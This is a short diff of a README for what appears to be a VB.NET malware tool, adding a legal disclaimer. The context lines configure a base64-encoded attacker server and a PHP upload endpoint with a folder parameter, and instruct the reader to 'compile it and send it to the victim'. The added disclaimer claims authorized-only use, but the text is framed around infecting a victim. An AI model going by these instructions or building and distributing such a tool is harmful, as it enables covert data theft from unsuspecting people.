@@ -47,3 +47,7 @@ Dim server As String = BaseDecode1("your server address here in base64 encoded")
 Dim php As String = "yourphpfilename.php?" & "folder="
 ```
  - Just compile it and send it to the victim thats all !!
+ 
+ 
+ ## Disclaimer:
+**This tool is supposed to be used only on authorized systems. Any unauthorized use of this tool without explicit permission is illegal.**
